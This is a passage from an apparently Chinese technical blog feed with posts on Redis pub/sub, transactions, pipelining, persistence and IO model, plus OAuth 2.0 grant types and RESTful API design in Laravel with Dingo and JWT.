title="生产者"></a>生产者</h2><pre><code class="bash"><span class="comment"># -*- coding: utf-8 -*-</span>import redisclient = redis.StrictRedis()client.publish(<span class="string">"sevenshi"</span>, <span class="string">"hi"</span>)client.publish(<span class="string">"sevenshi"</span>, <span class="string">"i am fine,thank you"</span>)client.publish(<span class="string">"sevenshi"</span>, <span class="string">"and you"</span>)</code></pre><h2 id="PubSub缺点"><a href="#PubSub缺点" class="headerlink" title="PubSub缺点"></a>PubSub缺点</h2><ul><li>消息不持久化</li><li>有进程挂掉时，消息不同步</li></ul><p>so，很鸡肋的功能。</p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Redis事务</title>
      <link href="/2018/08/19/Redis%E4%BA%8B%E5%8A%A1/"/>
      <url>/2018/08/19/Redis%E4%BA%8B%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<p>Redis的事务，假的事务，了解一下<br><a id="more"></a></p><p>为了保证连续多个操作的原子性以及数据的完整性，数据库都支持事务，Redis的事务对比关系数据库的事务来说更简单，不过，也正是太简单，导致Redis的事务就像一个假的事务，同时我们也不能向使用关系数据库的事务一样来使用</p><h1 id="Redis的事务"><a href="#Redis的事务" class="headerlink" title="Redis的事务"></a>Redis的事务</h1><p>Redis 使用事务的指令，分别是 multi/exec/discard。multi 指示事务的开始，exec 指示事务的执行，discard 指示事务的丢弃。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; multi</span><br><span class="line">OK</span><br><span class="line">&gt; incr ages</span><br><span class="line">QUEUED</span><br><span class="line">&gt; incr ages</span><br><span class="line">QUEUED</span><br><span class="line">&gt; <span class="built_in">exec</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br></pre></td></tr></table></figure></p><p>以上就是Redis事务的一个完整过程，因为Redis是单线程的原因，所以不担心在执行队列的时候被其他指令大脚，保证原子性的执行</p><h2 id="假的原子性"><a href="#假的原子性" class="headerlink" title="假的原子性"></a>假的原子性</h2><p>原子性是指事务要么全部成功，要么全部失败，但是Redis是假的原子性，请看以下执行结果<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt; multi</span><br><span class="line">OK</span><br><span class="line">&gt; <span class="built_in">set</span> name seven</span><br><span class="line">QUEUED</span><br><span class="line">&gt; incr name</span><br><span class="line">QUEUED</span><br><span class="line">&gt; <span class="built_in">set</span> age 23</span><br><span class="line">QUEUED</span><br><span class="line">&gt; <span class="built_in">exec</span></span><br><span class="line">1) OK</span><br><span class="line">2) (error) ERR value is not an <span class="built_in">integer</span> or out of range</span><br><span class="line">3) OK</span><br><span class="line">&gt; get name</span><br><span class="line"><span class="string">"seven"</span></span><br><span class="line">&gt;  get age</span><br><span class="line">23</span><br></pre></td></tr></table></figure></p><p>很明显，事务执行中间遇到了失败，但是后面的指令正常运行，因此Redis的事务根本不能算是原子性，而是隔离性，即当前执行的事务有着不被其他事务打断的权利</p><h2 id="乐观锁-amp-watch机制"><a href="#乐观锁-amp-watch机制" class="headerlink" title="乐观锁&amp;watch机制"></a>乐观锁&amp;watch机制</h2><p>当对资源的访问出现并发问题的时候，我们可以通过Redis的分布式锁来解决冲突，分布式锁之前已经讲过了，分布式锁是一种悲观锁，这回我们使用乐观锁来解决并发的问题。</p><h3 id="watch机制"><a href="#watch机制" class="headerlink" title="watch机制"></a>watch机制</h3><p>Redis 禁止在 multi 和 exec 之间执行 watch 指令，而必须在 multi 之前做好盯住关键变量，否则会出错。<br>被watch被监控的如果发生改动，exec 指令就会返回 null 回复告知客户端事务执行失败，可参考如下的例子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt; watch age</span><br><span class="line">OK</span><br><span class="line">&gt; incr age  <span class="comment"># 被修改了</span></span><br><span class="line">(<span class="built_in">integer</span>) 24</span><br><span class="line">&gt; multi</span><br><span class="line">OK</span><br><span class="line">&gt; incr age</span><br><span class="line">QUEUED</span><br><span class="line">&gt; <span class="built_in">exec</span>  <span class="comment"># 事务执行失败</span></span><br><span class="line">(nil)</span><br></pre></td></tr></table></figure></p><h2 id="pipeline执行事务指令"><a href="#pipeline执行事务指令" class="headerlink" title="pipeline执行事务指令"></a>pipeline执行事务指令</h2><p>当一个事务内部的指令较多时，需要的网络 IO 时间也会线性增长。所以通常 Redis 的客户端在执行事务时都会结合 pipeline 一起使用，这样可以将多次 IO 操作压缩为单次 IO 操作。</p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Redis管道</title>
      <link href="/2018/08/17/Redis%E7%AE%A1%E9%81%93/"/>
      <url>/2018/08/17/Redis%E7%AE%A1%E9%81%93/</url>
      
        <content type="html"><![CDATA[<p>管道就是流水线技术，可类比计算机网络数据链路层的流量控制方法中的停止等待协议和GBN协议</p><a id="more"></a><h1 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h1><p>单个命令响应类似下图：</p><p><img src="停止等待协议.png" alt=""></p><p>连续执行多条指令，那就会花费多个网络数据包来回的时间</p><p>但是如果我们改成连续的发起请求，不用等待ack确认后才发送连续多个写的操作和连续的读操作的可以大幅节省IO时间，管道中指令越多，效果越好<br>就像这样子：</p><p><img src="redis.png" alt=""></p><h1 id="深入理解管道本质"><a href="#深入理解管道本质" class="headerlink" title="深入理解管道本质"></a>深入理解管道本质</h1><p>完整的客户端到服务端的指令请求交互流程如下所示：</p><ul><li>客户端进程调用write将消息写到操作系统内核为套接字分配的发送缓冲send buffer。</li><li>客户端操作系统内核将发送缓冲的内容发送到网卡，网卡硬件将数据通过「网际路由」送到服务器的网卡。</li><li>服务器操作系统内核将网卡的数据放到内核为套接字分配的接收缓冲recv buffer。</li><li>服务器进程调用read从接收缓冲中取出消息进行处理。</li><li>服务器进程调用write将响应消息写到内核为套接字分配的发送缓冲send buffer。</li><li>服务器操作系统内核将发送缓冲的内容发送到网卡，网卡硬件将数据通过「网际路由」送到客户端的网卡。</li><li>客户端操作系统内核将网卡的数据放到内核为套接字分配的接收缓冲recv buffer。</li><li>客户端进程调用read从接收缓冲中取出消息返回给上层业务逻辑进行处理。</li></ul><p>write 操作只负责将数据写到本地操作系统内核的发送缓冲然后就返回了。剩下的事交给操作系统内核异步将数据送到目标机器。但是如果发送缓冲满了，那么就需要等待缓冲空出空闲空间来，这个就是写操作 IO 操作的真正耗时。<br>read 操作只负责将数据从本地操作系统内核的接收缓冲中取出来就了事了。但是如果缓冲是空的，那么就需要等待数据到来，这个就是读操作 IO 操作的真正耗时。</p><p>对于value = redis.get(key)这样一个简单的请求来说，write操作几乎没有耗时，直接写到发送缓冲就返回，而read就会比较耗时了，因为它要等待消息经过网络路由到目标机器处理后的响应消息,再回送到当前的内核读缓冲才可以返回。这才是一个网络来回的真正开销。</p><p>而对于管道来说，连续的write操作根本就没有耗时，之后第一个read操作会等待一个网络的来回开销，然后所有的响应消息就都已经回送到内核的读缓冲了，后续的 read 操作直接就可以从缓冲拿到结果，瞬间就返回了。…</p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Redis持久化</title>
      <link href="/2018/08/17/Redis%E6%8C%81%E4%B9%85%E5%8C%96/"/>
      <url>/2018/08/17/Redis%E6%8C%81%E4%B9%85%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>上面我们讲到，因为Redis 的数据全部在内存里，所以Redis会很快，如果突然宕机，内存中的数据就会全部丢失，因此必须有一种机制来保证 Redis 的数据不会因为故障而丢失，这种机制就是 Redis 的持久化机制。</p><a id="more"></a><h1 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h1><p>Redis 的持久化机制有两种，第一种是快照，一次全量备份，是内存数据的二进制序列化形式，在存储上非常紧凑。第二种是 AOF 日志，连续的增量备份，而 AOF 日志记录的是内存数据修改的指令记录文本。AOF 日志在长期的运行过程中会变的无比庞大，数据库重启时需要加载 AOF 日志进行指令重放，这个时间就会无比漫长。所以需要定期进行 AOF 重写，给 AOF 日志进行瘦身。</p><h2 id="快照"><a href="#快照" class="headerlink" title="快照"></a>快照</h2><p>上文说到，Redis 是单线程程序，这个线程要同时负责多个客户端套接字的并发读写操作和内存数据结构的逻辑读写。<br>在服务线上请求的同时，Redis 还需要进行内存快照，内存快照要求 Redis 必须进行文件 IO 操作，可文件 IO 操作是不能使用多路复用 API。…<br>意味着单线程同时在服务线上的请求还要进行文件 IO 操作，文件 IO 操作会严重拖垮服务器请求的性能。还有个重要的问题是为了不阻塞线上的业务，就需要边持久化边响应客户端请求</p><p>操作系统的多进程COW(Copy On Write)机制来实现快照持久化可破</p><h3 id="fork多进程"><a href="#fork多进程" class="headerlink" title="fork多进程"></a>fork多进程</h3><p>fork函数会在父子进程同时返回，在父进程里返回子进程的 pid，在子进程里返回零。如果操作系统内存资源不足，pid 就会是负数，表示fork失败。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pid = os.fork()</span><br><span class="line"><span class="keyword">if</span> pid &gt; 0:</span><br><span class="line">    handle_client_requests()  <span class="comment"># 父进程继续处理客户端请求</span></span><br><span class="line"><span class="keyword">if</span> pid == 0:</span><br><span class="line">    handle_snapshot_write()  <span class="comment"># 子进程处理快照写磁盘</span></span><br><span class="line"><span class="keyword">if</span> pid &lt; 0:</span><br><span class="line">    <span class="comment"># fork error...</span></span><br></pre></td></tr></table></figure></p><p>子进程做数据持久化，它不会修改现有的内存数据结构，它只是对数据结构进行遍历读取，然后序列化写到磁盘中。但是父进程不一样，它必须持续服务客户端请求，然后对内存数据结构进行不间断的修改。<br>这个时候就会使用操作系统的 COW 机制来进行数据段页面的分离。数据段是由很多操作系统的页面组合而成，当父进程对其中一个页面的数据进行修改时，会将被共享的页面复制一份分离出来，然后对这个复制的页面进行修改。这时子进程相应的页面是没有变化的，还是进程产生时那一瞬间的数据。…</p><p>随着父进程修改操作的持续进行，越来越多的共享页面被分离出来，内存就会持续增长。但是也不会超过原有数据内存的 2 倍大小。另外一个 Redis 实例里冷数据占的比例往往是比较高的，所以很少会出现所有的页面都会被分离，被分离的往往只有其中一部分页面。每个页面的大小只有 4K，一个 Redis 实例里面一般都会有成千上万的页面。</p><p>子进程因为数据没有变化，它能看到的内存里的数据在进程产生的一瞬间就凝固了，再也不会改变，这也是为什么 Redis 的持久化叫「快照」的原因。接下来子进程就可以非常安心的遍历数据了进行序列化写磁盘了。…</p><h2 id="AOF"><a href="#AOF" class="headerlink" title="AOF"></a>AOF</h2><p>AOF 日志存储的是 Redis 服务器的顺序指令序列，AOF 日志只记录对内存进行修改的指令记录。</p><p>假设 AOF 日志记录了自 Redis 实例创建以来所有的修改性指令序列，那么就可以通过对一个空的 Redis 实例顺序执行所有的指令，也就是「重放」，来恢复 Redis 当前实例的内存数据结构的状态。…</p><p>Redis 在长期运行的过程中，AOF 的日志会越变越长。如果实例宕机重启，重放整个 AOF 日志会非常耗时，导致长时间 Redis 无法对外提供服务。所以需要对 AOF 日志瘦身。也就是AOF重写</p><h3 id="AOF重写"><a href="#AOF重写" class="headerlink" title="AOF重写"></a>AOF重写</h3><p>Redis 提供了 bgrewriteaof 指令用于对 AOF 日志进行瘦身。其原理就是开辟一个子进程对内存进行遍历转换成一系列 Redis 的操作指令，序列化到一个新的 AOF 日志文件中。序列化完毕后再将操作期间发生的增量 AOF 日志追加到这个新的 AOF 日志文件中，追加完毕后就立即替代旧的 AOF 日志文件了，瘦身工作就完成了。…</p><h2 id="Redis4-0混合持久化"><a href="#Redis4-0混合持久化" class="headerlink" title="Redis4.0混合持久化"></a>Redis4.0混合持久化</h2><p>重启 Redis 时，我们很少使用 rdb 来恢复内存状态，因为会丢失大量数据。我们通常使用 AOF 日志重放，但是重放 AOF 日志性能相对 rdb 来说要慢很多，这样在 Redis 实例很大的情况下，启动需要花费很长的时间。</p><p>Redis 4.0 为了解决这个问题，带来了一个新的持久化选项——混合持久化。将 rdb 文件的内容和增量的 AOF 日志文件存在一起。这里的 AOF 日志不再是全量的日志，而是自持久化开始到持久化结束的这段时间发生的增量 AOF 日志，通常这部分 AOF 日志很小。…</p><p>于是在 Redis 重启的时候，可以先加载 rdb 的内容，然后再重放增量 AOF 日志就可以完全替代之前的 AOF 全量文件重放，重启效率因此大幅得到提升。</p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>OAuth2.0协议的理解</title>
      <link href="/2018/08/17/OAuth2-0%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%90%86%E8%A7%A3/"/>
      <url>/2018/08/17/OAuth2-0%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>总结我们经常使用到的的OAUTH2.0授权码模式和密码模式</p><a id="more"></a><h1 id="理解OAuth-2-0"><a href="#理解OAuth-2-0" class="headerlink" title="理解OAuth 2.0"></a>理解OAuth 2.0</h1><p>OAuth是一个关于授权（authorization）的开放网络标准，在全世界得到广泛应用，目前的版本是2.0版。</p><p>OAuth 2.0 的授权模式一共有4种，其中常用的有授权码模式和密码模式</p><h1 id="授权码模式"><a href="#授权码模式" class="headerlink" title="授权码模式"></a>授权码模式</h1><p>主要应用在平台给第三方的应用进行用户授权。我们通常说的第三方登录都是指授权码模式。</p><p>简单的解释一下流程</p><ul><li>客户端（app/浏览器）将用户导向第三方认证服务器</li><li>用户在第三方认证服务器，选择是否给予客户端授权</li><li>用户同意授权后，认证服务器将用户导向客户端事先指定的 重定向URI，同时附上一个授权码。</li><li>客户端将授权码发送至服务器，服务器通过授权码以及 APP_SECRET 向第三方服务器申请 access_token</li><li>服务器通过 access_token，向第三方服务器申请用户数据，完成登录流程</li></ul><p>应用场景：</p><p>大家可以操作体验一下</p><ul><li>打开知乎，其他登录方式中选择微信登录</li><li>跳转到微信，提示我们是否授权知乎应用的登录</li><li>点击 确认登录 后，跳转回知乎，如果是第一次登录，会进入知乎接下来绑定手机号的流程。如果不是第一次使用微信登录，那么会直接跳转到知乎首页。</li><li>这个流程就是 OAuth 2.0 的基本流程。</li></ul><p>对于 APP 第三方登陆来说有两种实现方法</p><ul><li><p>APP_SECRET 存储在客户端，客户端获取授权码之后，直接通过授权码和 APP_SECRET 去第三方换取 access_token。</p></li><li><p>APP_SECRET 存储在服务端，客户端获取授权码之后，将授权码发送给服务器，服务器通过授权码和 APP_SECRET 去第三方换取 access_token。（推荐）</p></li></ul><p>具体可以参考微信的开发，<a href="申请公众平台测试账号十分方便，直接通过微信登录即可，登录地址">登陆地址</a></p><h1 id="密码模式"><a href="#密码模式" class="headerlink" title="密码模式"></a>密码模式</h1><p>对于自己的客户端，我们就不需要这么麻烦的中间授权码流程了，用户应该直接在客户端中输入用户名和密码，客户端直接通过用户数据的用户名和密码获取 access_token 即可。<br>同jwt一致</p><p>密码模式流程如下：</p><ul><li>用户在客户端输入用户名和密码；</li><li>客户端提交用户名，密码，client_id 和 client_secret 到服务器；</li><li>服务器直接返回 access_token；</li></ul>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Redis线程IO模型</title>
      <link href="/2018/08/16/redis%E7%BA%BF%E7%A8%8BIO%E6%A8%A1%E5%9E%8B/"/>
      <url>/2018/08/16/redis%E7%BA%BF%E7%A8%8BIO%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<p>Redis是单线程程序，了解一下</p><a id="more"></a><p>Redis是单线程程序，但是为什么都说Redis很快呢，因为其所有的数据都在内存中，所有的运算都是内存级别的运算，而且，也因为Redis是单线程，所以对于时间复杂度为O（n）级别的指令，一定要谨慎使用，一不小心就会卡顿了</p><h2 id="线程IO模型的特性"><a href="#线程IO模型的特性" class="headerlink" title="线程IO模型的特性"></a>线程IO模型的特性</h2><h3 id="非阻塞IO"><a href="#非阻塞IO" class="headerlink" title="非阻塞IO"></a>非阻塞IO</h3><blockquote><p>一般套接字的读写方法，调用套接字的读写方法，默认它们是阻塞的，比如read方法要传递进去一个参数n，表示读取这么多字节后再返回，如果没有读够线程就会卡在那里，直到新的数据到来或者连接关闭了，read方法才可以返回，线程才能继续处理。而write方法一般来说不会阻塞，除非内核为套接字分配的写缓冲区已经满了，write方法就会阻塞，直到缓存区中有空闲空间挪出来</p></blockquote><p>而非阻塞IO在套接字对象上提供了一个选项NON_Blocking,读多少取决于内核为套接字分配的读缓冲区内部的数据字节数，能写多少取决于内核为套接字分配的写缓冲区的空闲空间字节数。读方法和写方法都会通过返回值来告知程序实际读写了多少字节。<br>有了非阻塞 IO 意味着线程在读写 IO 时可以不必再阻塞了，读写可以瞬间完成然后线程可以继续干别的事了。</p><h3 id="事件轮询（多路复用）"><a href="#事件轮询（多路复用）" class="headerlink" title="事件轮询（多路复用）"></a>事件轮询（多路复用）</h3><blockquote><p>非阻塞 IO 有个问题，那就是线程要读数据，结果读了一部分就返回了，线程如何知道何时才应该继续读。也就是当数据到来时，线程如何得到通知。写也是一样，如果缓冲区满了，写不完，剩下的数据何时才应该继续写，线程也应该得到通知。</p></blockquote><p>阻塞IO会一直等待，非阻塞的话需要通过事件轮询来处理未完成的事</p><p>最简单的事件轮询 API 是select函数，它是操作系统提供给用户程序的 API。输入是读写描述符列表read_fds &amp; write_fds，输出是与之对应的可读可写事件。同时还提供了一个timeout参数，如果没有任何事件到来，那么就最多等待timeout时间，线程处于阻塞状态。一旦期间有任何事件到来，就可以立即返回。时间过了之后还是没有任何事件到来，也会立即返回。拿到事件后，线程就可以继续挨个处理相应的事件。处理完了继续过来轮询。于是线程就进入了一个死循环，我们把这个死循环称为事件循环，一个循环为一个周期…</p><p>伪代码如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">read_events, write_events = select(read_fds, write_fds, timeout)</span><br><span class="line"><span class="keyword">for</span> event <span class="keyword">in</span> read_events:</span><br><span class="line">    handle_read(event.fd)</span><br><span class="line"><span class="keyword">for</span> event <span class="keyword">in</span> write_events:</span><br><span class="line">    handle_write(event.fd)</span><br><span class="line">handle_others()  <span class="comment"># 处理其它事情，如定时任务等...</span></span><br></pre></td></tr></table></figure><h3 id="指令队列"><a href="#指令队列" class="headerlink" title="指令队列"></a>指令队列</h3><p>Redis可以接受多个客户端的连接，将每个客户端套接字都关联一个指令队列。客户端的指令通过队列来排队进行顺序处理，先到先服务。</p><h3 id="响应队列"><a href="#响应队列" class="headerlink" title="响应队列"></a>响应队列</h3><p>Redis 同样也会为每个客户端套接字关联一个响应队列。Redis 服务器通过响应队列来将指令的返回结果回复给客户端。 如果队列为空，那么意味着连接暂时处于空闲状态，不需要去获取写事件</p><h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><p>如果线程阻塞在select系统调用上，是如何解决定时任务无法得到准时调度</p><p>Redis 的定时任务会记录在一个称为最小堆的数据结构中。这个堆中，最快要执行的任务排在堆的最上方。在每个循环周期，Redis 都会将最小堆里面已经到点的任务立即进行处理。处理完毕后，将最快要执行的任务还需要的时间记录下来，这个时间就是select系统调用的timeout参数.</p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用laravel开发api知识点总结</title>
      <link href="/2018/08/15/%E4%BD%BF%E7%94%A8laravel%E5%BC%80%E5%8F%91api/"/>
      <url>/2018/08/15/%E4%BD%BF%E7%94%A8laravel%E5%BC%80%E5%8F%91api/</url>
      
        <content type="html"><![CDATA[<p>本文主要专注于 App 的后端 API 服务器开发。 编写主要关于RESTFul，OAuth 流程，Fractal，Transformer，API 图片上传，JWT 概念及使用 和 API 开发相关的知识。</p><a id="more"></a><h1 id="RESTful"><a href="#RESTful" class="headerlink" title="RESTful"></a>RESTful</h1><h2 id="什么是RESTful"><a href="#什么是RESTful" class="headerlink" title="什么是RESTful"></a>什么是RESTful</h2><blockquote><p>RESTful 是一种软件设计风格，由 Roy Fielding 在他的 论文 中提出，全称为 Representational State Transfer，直译为表现层状态转移，或许可以解释为用 URL 定位资源，用 HTTP 动词描述操作</p></blockquote><h2 id="为什么选择RESTful"><a href="#为什么选择RESTful" class="headerlink" title="为什么选择RESTful"></a>为什么选择RESTful</h2><ul><li>安全可靠，高效，易扩展。</li><li>简单明了，可读性强，没有歧义。</li><li>API 风格统一，调用规则，传入参数和返回数据有统一的标准</li></ul><h2 id="RESTful-设计原则"><a href="#RESTful-设计原则" class="headerlink" title="RESTful 设计原则"></a>RESTful 设计原则</h2><h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><p>HTTPS 为接口的安全提供了保障，可以有效防止通信被窃听和篡改</p><h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><p>应当尽可能的将 API 与其主域名区分开，可以使用专用的域名或者可以放在主域名下，访问我们的 API，可以采取</p><pre><code>https://api.domain.com或者https://www.domain.com/api</code></pre><h3 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h3><p>随着业务的发展，需求的不断变化，API 的迭代是必然的，很可能当前版本正在使用，而我们就得开发甚至上线一个不兼容的新版本，为了让旧用户可以正常使用，为了保证开发的顺利进行，我们需要控制好 API 的版本。<br>可以采取：</p><ul><li><p>将版本号直接加入 URL 中</p><p>  <a href="https://api.domain.com/v1" target="_blank" rel="noopener">https://api.domain.com/v1</a><br>  <a href="https://api.domain.com/v2" target="_blank" rel="noopener">https://api.domain.com/v2</a></p></li><li><p>使用 HTTP 请求头的 Accept 字段进行区分</p><p>  <a href="https://api.domain.com/" target="_blank" rel="noopener">https://api.domain.com/</a></p><pre><code>Accept: application/prs.domain.v1+jsonAccept: application/prs.domain.v2+json</code></pre></li></ul><h3 id="用URL-定位资源"><a href="#用URL-定位资源" class="headerlink" title="用URL 定位资源"></a>用URL 定位资源</h3><p>在 RESTful 的架构中，所有的一切都表示资源，每一个 URL 都代表着一种资源，资源应当是一个名词，而且大部分情况下是名词的复数，尽量不要在 URL 中出现动词</p><p>如github的设计</p><pre><code>GET /issues                                      列出所有的 issueGET /orgs/:org/issues                            列出某个项目的 issueGET /repos/:owner/:repo/issues/:number           获取某个项目的某个 issuePOST /repos/:owner/:repo/issues                  为某个项目创建 issuePATCH /repos/:owner/:repo/issues/:number         修改某个 issuePUT /repos/:owner/:repo/issues/:number/lock      锁住某个 issueDELETE /repos/:owner/:repo/issues/:number/lock   接收某个 issue</code></pre><h3 id="用HTTP-动词描述操作"><a href="#用HTTP-动词描述操作" class="headerlink" title="用HTTP 动词描述操作"></a>用HTTP 动词描述操作</h3><p>HTTP 设计了很多动词，来表示不同的操作，RESTful 很好的利用的这一点，我们需要正确的使用 HTTP 动词，来表明我们要如何操作资源。<br>幂等性：指一次和多次请求某一个资源应该具有同样的副作用，也就是一次访问与多次访问，对这个资源带来的变化是相同的。</p><h3 id="资源过滤"><a href="#资源过滤" class="headerlink" title="资源过滤"></a>资源过滤</h3><p>我们需要提供合理的参数供客户端过滤资源，例如</p><pre><code>?state=closed: 不同状态的资源?page=2&amp;per_page=100：访问第几页数据，每页多少条。?sortby=name&amp;order=asc：指定返回结果按照哪个属性排序，以及排序顺序。</code></pre><h3 id="正确使用状态码"><a href="#正确使用状态码" class="headerlink" title="正确使用状态码"></a>正确使用状态码</h3><pre><code>HTTP 提供了丰富的状态码供我们使用，正确的使用状态码可以让响应数据更具可读性。200 OK - 对成功的 GET、PUT、PATCH 或 DELETE 操作进行响应。也可以被用在不创建新资源的 POST 操作上201 Created - 对创建新资源的 POST 操作进行响应。应该带着指向新资源地址的 Location 头202 Accepted - 服务器接受了请求，但是还未处理，响应中应该包含相应的指示信息，告诉客户端该去哪里查询关于本次请求的信息204 No Content - 对不会返回响应体的成功请求进行响应（比如 DELETE 请求）304 Not Modified - HTTP缓存header生效的时候用400 Bad Request - 请求异常，比如请求中的body无法解析401 Unauthorized - 没有进行认证或者认证非法403 Forbidden - 服务器已经理解请求，但是拒绝执行它404 Not Found - 请求一个不存在的资源405 Method Not Allowed - 所请求的 HTTP 方法不允许当前认证用户访问410 Gone - 表示当前请求的资源不再可用。当调用老版本 API 的时候很有用415 Unsupported Media Type - 如果请求中的内容类型是错误的422 Unprocessable Entity - 用来表示校验错误429 Too Many Requests - 由于请求频次达到上限而被拒绝访问</code></pre><h3 id="数据响应格式"><a href="#数据响应格式" class="headerlink" title="数据响应格式"></a>数据响应格式</h3><p>考虑到响应数据的可读性及通用性，默认使用 JSON 作为数据响应格式。如果客户端有需求使用其他的响应格式，例如 XML，需要在 Accept 头中指定需要的格式</p><pre><code>https://api.domain.com/    Accept: application/prs.domain.v1+json    Accept: application/prs.domain.v1+xml</code></pre><h3 id="对于错误的数据，可参考如下结构"><a href="#对于错误的数据，可参考如下结构" class="headerlink" title="对于错误的数据，可参考如下结构"></a>对于错误的数据，可参考如下结构</h3><pre><code>&apos;message&apos; =&gt; &apos;:message&apos;,          // 错误的具体描述&apos;errors&apos; =&gt; &apos;:errors&apos;,            // 参数的具体错误描述，422 等状态提供&apos;code&apos; =&gt; &apos;:code&apos;,                // 自定义的异常码&apos;status_code&apos; =&gt; &apos;:status_code&apos;,  // http状态码&apos;debug&apos; =&gt; &apos;:debug&apos;,              // debug 信息，非生产环境提供</code></pre><h3 id="调用频率限制"><a href="#调用频率限制" class="headerlink" title="调用频率限制"></a>调用频率限制</h3><p>为了防止服务器被攻击，减少服务器压力，需要对接口进行合适的限流控制，需要在响应头信息中加入合适的信息，告知客户端当前的限流情况</p><ul><li>X-RateLimit-Limit :100 最大访问次数</li><li>X-RateLimit-Remaining :93 剩余的访问次数</li><li>X-RateLimit-Reset :1513784506 到该时间点，访问次数会重置为 X-RateLimit-Limit</li></ul><h3 id="编写文档"><a href="#编写文档" class="headerlink" title="编写文档"></a>编写文档</h3><p>为了方便用户使用，我们需要提供清晰的文档，尽可能包括以下几点</p><ul><li>包括每个接口的请求参数，每个参数的类型限制，是否必填，可选的值等。</li><li>响应结果的例子说明，包括响应结果中，每个参数的释义。</li><li>对于某一类接口，需要有尽量详细的文字说明，比如针对一些特定场景，接口应该如何调用</li></ul><h1 id="DingoAPI"><a href="#DingoAPI" class="headerlink" title="DingoAPI"></a>DingoAPI</h1><p>dingo/api 是一个 Lumen 和 Laravel 都可用的 RestFul 工具包，帮助我们快速的开始构建 RestFul Api</p><p>中文文档参考这个<a href="https://laravel-china.org/docs/dingo-api/2.0.0" target="_blank" rel="noopener">Dingo API 2.0.0 中文文档</a></p><h2 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h2><p><a href="https://laravel-china.org/docs/dingo-api/2.0.0/Responses/1446" target="_blank" rel="noopener">Dingo数据响应设置</a></p><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p><a href="https://laravel-china.org/docs/dingo-api/2.0.0/Errors-And-Error-Responses/1447" target="_blank" rel="noopener">错误异常和错误响应</a></p><h2 id="Transformers"><a href="#Transformers" class="headerlink" title="Transformers"></a>Transformers</h2><p><a href="https://laravel-china.org/docs/dingo-api/2.0.0/Transformers/1448" target="_blank" rel="noopener">将对象转换为一个数组</a></p><h2 id="api认证"><a href="#api认证" class="headerlink" title="api认证"></a>api认证</h2><p><a href="https://github.com/tymondesigns/jwt-auth" target="_blank" rel="noopener">JWT-AUTH</a></p><p>一般来说都是用JWT,JWT 是 JSON Web Token 的缩写，是一个非常轻巧的规范，这个规范允许我们使用 JWT 在用户和服务器之间传递安全可靠的信息。</p><p>JWT 由头部（header）、载荷（payload）与签名（signature）组成，一个 JWT 类似下面这样：</p><pre><code>{    &quot;typ&quot;:&quot;JWT&quot;,    &quot;alg&quot;:&quot;HS256&quot;}{    &quot;iss&quot;:&quot;http://larabbs.test&quot;,    &quot;iat&quot;:1515733500,    &quot;exp&quot;:1515737100,    &quot;nbf&quot;:1515733500,    &quot;jti&quot;:&quot;c3U4VevxG2ZA1qhT&quot;,    &quot;sub&quot;:1,    &quot;prv&quot;:&quot;23bd5c8949f600adb39e701c400872db7a5976f7&quot;}signature</code></pre><ul><li>头部申明了加密算法；</li><li>载荷中有两个比较重要的数据，exp 是过期时间，sub 是 JWT 的主体，这里就是用户的 id；</li><li>最后的 signature 是由服务器进行的签名，保证了 token 